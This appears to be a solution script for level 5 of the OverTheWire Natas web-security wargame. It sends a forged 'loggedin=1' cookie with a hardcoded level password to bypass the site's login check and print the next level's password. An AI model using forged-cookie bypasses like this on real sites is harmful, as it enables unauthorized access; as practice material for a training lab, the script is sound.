import requests
url="http://natas5.natas.labs.overthewire.org"
auth_name = 'natas5'
auth_pass = 'Z0NsrtIkJoKALBCLi5eqFfcRN82Au2oD'

c=dict(loggedin='1')
r=requests.get(url,auth=(auth_name,auth_pass),cookies=c)

for x in r.iter_lines():
    if("natas6" in x.decode("utf-8")):
        print(x)
